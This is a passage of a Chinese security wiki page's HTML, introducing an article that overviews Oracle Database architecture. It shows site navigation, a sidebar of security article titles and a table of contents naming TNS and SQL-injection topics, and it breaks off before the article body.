@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+    <title>Oracle Database简单概述 | Tahir&#39;s Wiki</title>
+    
+    
+        <meta name="keywords" content="Oracle Database">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="[TOC] Oracle 数据库体系结构     分为两个大部分： RDBMS 关系数据库管理系统控制文件（.ctl） 数据文件（.dbf） 日志文件（.log） SGA：系统全局区，主要包括： 共享池：用于存储最近定义的sql语句和数据定义。 Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。 1）数据块缓存区数据块缓存区(datablockbuffe">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Oracle Database简单概述">
+<meta property="og:url" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/index.html">
+<meta property="og:site_name" content="Tahir&#39;s Wiki">
+<meta property="og:description" content="[TOC] Oracle 数据库体系结构     分为两个大部分： RDBMS 关系数据库管理系统控制文件（.ctl） 数据文件（.dbf） 日志文件（.log） SGA：系统全局区，主要包括： 共享池：用于存储最近定义的sql语句和数据定义。 Oracle使用最近最少使用(LRU，leastrecentlyused)算法来管理可用空间。 1）数据块缓存区数据块缓存区(datablockbuffe">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/1.gif">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/3.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/4.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/5.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/7.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/9.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/8.png">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/6.jpg">
+<meta property="og:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/11.png">
+<meta property="og:image" content="http://example.com/10.PNG">
+<meta property="article:published_time" content="2021-07-03T02:59:15.000Z">
+<meta property="article:modified_time" content="2021-07-03T03:04:35.397Z">
+<meta property="article:author" content="Tahir">
+<meta property="article:tag" content="Oracle Database">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/1.gif">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="Tahir&#39;s Wiki" type="application/atom+xml">
+    
+
+    
+        <link rel="icon" href="/favicon.ico">
+    
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/libs/open-sans/styles.css">
+
+    
+<link rel="stylesheet" href="/libs/source-code-pro/styles.css">
+
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<script src="/libs/jquery/2.1.3/jquery.min.js"></script>
+
+    
+<script src="/libs/jquery/plugins/cookie/1.4.1/jquery.cookie.js"></script>
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css">
+
+    
+    
+        
+<link rel="stylesheet" href="/libs/justified-gallery/justifiedGallery.min.css">
+
+    
+    
+    
+    
+
+
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+    <div id="container">
+        <header id="header">
+    <div id="header-main" class="header-inner">
+        <div class="outer">
+            <a href="/" id="logo">
+                <i class="logo"></i>
+                <span class="site-title">Tahir&#39;s Wiki</span>
+            </a>
+            <nav id="main-nav">
+                
+                    <a class="main-nav-link" href="/">首页</a>
+                
+                    <a class="main-nav-link" href="/archives">归档</a>
+                
+                    <a class="main-nav-link" href="/categories">分类</a>
+                
+                    <a class="main-nav-link" href="/tags">标签</a>
+                
+                    <a class="main-nav-link" href="/about">关于</a>
+                
+            </nav>
+            
+            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="Type something...">
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: 'Posts',
+            PAGES: 'Pages',
+            CATEGORIES: 'Categories',
+            TAGS: 'Tags',
+            UNTITLED: '(Untitled)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+</div>
+        </div>
+    </div>
+    <div id="main-nav-mobile" class="header-sub header-inner">
+        <table class="menu outer">
+            <tr>
+                
+                    <td><a class="main-nav-link" href="/">首页</a></td>
+                
+                    <td><a class="main-nav-link" href="/archives">归档</a></td>
+                
+                    <td><a class="main-nav-link" href="/categories">分类</a></td>
+                
+                    <td><a class="main-nav-link" href="/tags">标签</a></td>
+                
+                    <td><a class="main-nav-link" href="/about">关于</a></td>
+                
+                <td>
+                    
+    <div class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="Search">
+    </div>
+
+                </td>
+            </tr>
+        </table>
+    </div>
+</header>
+
+        <div class="outer">
+            
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap" id="categories">
+        <h3 class="widget-title">
+            <span>categories</span>
+            &nbsp;
+            <a id="allExpand" href="#">
+                <i class="fa fa-angle-double-down fa-2x"></i>
+            </a>
+        </h3>
+        
+        
+        
+         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            1. 漏洞相关
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            MSSQL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/CVE-2020-0618-Microsoft-SQL-Server-Reporting-Services%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">CVE-2020-0618_SQL Server Reporting Services远程代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/MSSQL/BID-23649-Microsoft-SQL-Server-%E6%95%B0%E6%8D%AE%E5%BA%93%E9%93%BE%E6%8E%A5%E7%88%AC%E7%BD%91%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">BID-23649_SQL Server链接爬网命令执行漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            OpenSSL
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0224-OpenSSL%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%BC%8F%E6%B4%9E/">CVE-2014-0224_OpenSSL中间人漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/OpenSSL/CVE-2014-0160-OpenSSL%E5%BF%83%E8%84%8F%E6%BB%B4%E8%A1%80%E6%BC%8F%E6%B4%9E/">CVE-2014-0160_OpenSSL心脏滴血漏洞</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Redis
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/">Redis未授权访问漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/Redis%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">Redis主从复制代码执行漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2013-7458-Redis-redis-cli%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/">CVE-2013-7458_Redis redis-cli信息泄露漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-4335-Redis-EVAL-Lua%E6%B2%99%E7%AE%B1%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E/">CVE-2015-4335_Redis EVAL Lua沙箱绕过漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2015-8080-Redis-getnum%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2015-8080_Redis getnum整数溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-8339-Redis%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2016-8339_Redis缓冲区溢出漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2016-10517-Redis%E8%B7%A8%E5%8D%8F%E8%AE%AE%E6%BC%8F%E6%B4%9E/">CVE-2016-10517_Redis跨协议漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2017-15047-Redis%E6%95%B0%E7%BB%84%E7%B4%A2%E5%BC%95%E8%B6%8A%E7%95%8C%E6%BC%8F%E6%B4%9E/">CVE-2017-15047_Redis数组索引越界漏洞</a></li>  <li class="file"><a href="/wiki/1.%20%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/CVE-2018-11218-Redis-Lua%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/">CVE-2018-11218_Redis Lua缓冲区溢出漏洞</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            2. 数据库安全
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory open">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder-open"></i>
+                            &nbsp;
+                            Oracle Database
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file active"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">Oracle Database简单概述</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-PLSQL%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86/">Oracle Database PL/SQL注入漏洞原理</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database-11g-Wrap%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">Oracle Database 11g Wrap加密解密分析</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8A%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/The-Oracle-Hacker-s-Handbook-Hacking-and-Defending-Oracle-%E4%B8%8B%E7%AF%87/">The Oracle Hacker's Handbook: Hacking and Defending Oracle 下篇</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            SQL Server
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/">SQL Server数据库攻防详解上篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/">SQL Server数据库攻防详解下篇</a></li>  <li class="file"><a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA/">SQL Server数据库安全加固</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            3. 应急响应
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Linux应急响应
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Linux应急响应</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Windows应急响应
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/3.%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">Windows应急响应</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            4. 内网安全攻防
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            0-内网攻防基础
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/PowerShell%E5%9F%BA%E7%A1%80/">PowerShell基础</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/0-%E5%86%85%E7%BD%91%E6%94%BB%E9%98%B2%E5%9F%BA%E7%A1%80/%E9%83%A8%E7%BD%B2%E5%9F%9F%E7%8E%AF%E5%A2%83/">部署域环境</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            1-内网信息搜集
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">主机信息搜集</a></li>  <li class="file"><a href="/wiki/4.%20%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2/1-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域信息搜集</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            5. 高级威胁猎捕
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Cobalt Strike
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/0-Cobalt%20Strike%E9%9B%B6%E5%9F%BA%E7%A1%80/">0-Cobalt Strike零基础</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/">1-Cobalt Strike基础上篇</a></li>  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/">1-Cobalt Strike基础中篇</a></li>  </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            Defense Evasion
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            进程注入
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/5.%20%E9%AB%98%E7%BA%A7%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Defense%20Evasion/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/Shellcode-APC%E6%B3%A8%E5%85%A5%E5%92%8C%E5%8A%A0%E8%BD%BD/">Shellcode APC注入和加载</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            6. 威胁情报
+                        </a>
+                         <ul class="unstyled" id="tree"> 
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            APT情报
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/6.%20%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5/APT%E6%83%85%E6%8A%A5/%E7%9F%A5%E5%90%8DAPT%E7%BB%84%E7%BB%87%E6%A6%82%E8%BF%B0/">知名APT组织概述</a></li>  </ul> 
+                    </li> 
+                     </ul> 
+                    </li> 
+                    
+                    <li class="directory">
+                        <a href="#" data-role="directory">
+                            <i class="fa fa-folder"></i>
+                            &nbsp;
+                            7. 学习资源
+                        </a>
+                         <ul class="unstyled" id="tree">  <li class="file"><a href="/wiki/7.%20%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/">学习资源</a></li>  </ul> 
+                    </li> 
+                     <li class="file"><a href="/wiki/hello-world/">Hello World</a></li>  </ul> 
+    </div>
+    <script>
+        $(document).ready(function() {
+            var iconFolderOpenClass  = 'fa-folder-open';
+            var iconFolderCloseClass = 'fa-folder';
+            var iconAllExpandClass = 'fa-angle-double-down';
+            var iconAllPackClass = 'fa-angle-double-up';
+            // Handle directory-tree expansion:
+            // 左键单独展开目录
+            $(document).on('click', '#categories a[data-role="directory"]', function (event) {
+                event.preventDefault();
+
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var subtree = $(this).siblings('ul');
+                icon.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if (expanded) {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideUp({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderCloseClass);
+                } else {
+                    if (typeof subtree != 'undefined') {
+                        subtree.slideDown({ duration: 100 });
+                    }
+                    icon.addClass(iconFolderOpenClass);
+                }
+            });
+            // 右键展开下属所有目录
+            $('#categories a[data-role="directory"]').bind("contextmenu", function(event){
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconFolderOpenClass);
+                var listNode = $(this).siblings('ul');
+                var subtrees = $.merge(listNode.find('li ul'), listNode);
+                var icons = $.merge(listNode.find('.fa'), icon);
+                icons.removeClass(iconFolderOpenClass).removeClass(iconFolderCloseClass);
+                if(expanded) {
+                    subtrees.slideUp({ duration: 100 });
+                    icons.addClass(iconFolderCloseClass);
+                } else {
+                    subtrees.slideDown({ duration: 100 });
+                    icons.addClass(iconFolderOpenClass);
+                }
+            })
+            // 展开关闭所有目录按钮
+            $(document).on('click', '#allExpand', function (event) {
+                event.preventDefault();
+                
+                var icon = $(this).children('.fa');
+                var expanded = icon.hasClass(iconAllExpandClass);
+                icon.removeClass(iconAllExpandClass).removeClass(iconAllPackClass);
+                if(expanded) {
+                    $('#sidebar .fa.fa-folder').removeClass('fa-folder').addClass('fa-folder-open')
+                    $('#categories li ul').slideDown({ duration: 100 });
+                    icon.addClass(iconAllPackClass);
+                } else {
+                    $('#sidebar .fa.fa-folder-open').removeClass('fa-folder-open').addClass('fa-folder')
+                    $('#categories li ul').slideUp({ duration: 100 });
+                    icon.addClass(iconAllExpandClass);
+                }
+            });  
+        });
+    </script>
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+            <section id="main"><article id="post-2. 数据库安全/Oracle Database/Oracle-Database简单概述" class="article article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+        
+            <header class="article-header">
+                
+                    <div class="article-meta">
+                        
+    <div class="article-category">
+    	<i class="fa fa-folder"></i>
+        <a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/">2. 数据库安全</a><i class="fa fa-angle-right"></i><a class="article-category-link" href="/categories/2-%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle-Database/">Oracle Database</a>
+    </div>
+
+                        
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link-link" href="/tags/Oracle-Database/" rel="tag">Oracle Database</a>
+    </div>
+
+                        
+    <div class="article-date">
+        <i class="fa fa-calendar"></i>
+        <a href="/wiki/2.%20%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8/Oracle%20Database/Oracle-Database%E7%AE%80%E5%8D%95%E6%A6%82%E8%BF%B0/">
+            <time datetime="2021-07-03T02:59:15.000Z" itemprop="datePublished">2021-07-03</time>
+        </a>
+    </div>
+
+
+                        
+                            <i class="fa fa-bar-chart"></i>
+                            <span id="busuanzi_container_site_pv"><span id="busuanzi_value_page_pv"></span></span>    
+                        
+                        
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/raw/writing/source/_posts/2. 数据库安全/Oracle Database/Oracle-Database简单概述.md"> Source </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/edit/writing/source/_posts/2. 数据库安全/Oracle Database/Oracle-Database简单概述.md"> Edit </a>
+                            </div>
+                            <div class="article-meta-button">
+                                <a target="_blank" rel="external nofollow noopener noreferrer" href="https://github.com/TahirMars/Wiki-site/commits/writing/source/_posts/2. 数据库安全/Oracle Database/Oracle-Database简单概述.md"> History </a>
+                            </div>
+                        
+                    </div>
+                
+                
+    
+        <h1 class="article-title" itemprop="name">
+            Oracle Database简单概述
+        </h1>
+    
+
+            </header>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+        
+        
+            
+                <div id="toc" class="toc-article">
+                <strong class="toc-title">Catalogue</strong>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84"><span class="toc-number">1.</span> <span class="toc-text">Oracle 数据库体系结构</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RDBMS-%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.</span> <span class="toc-text">RDBMS 关系数据库管理系统</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TNS%E7%9B%91%E5%90%AC%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.2.</span> <span class="toc-text">TNS监听服务</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TNS%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.1.</span> <span class="toc-text">TNS协议结构</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-Database-TNS-%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">Oracle Database  TNS 漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TNS%E5%8A%AB%E6%8C%81"><span class="toc-number">2.1.</span> <span class="toc-text">TNS劫持</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TNS%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA"><span class="toc-number">2.2.</span> <span class="toc-text">TNS缓冲区溢出</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-Database-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">3.</span> <span class="toc-text">Oracle Database SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Oracle-%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%84%E4%BC%B0%E5%B7%A5%E5%85%B7"><span class="toc-number">4.</span> <span class="toc-text">Oracle 数据库评估工具</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sidguesser"><span 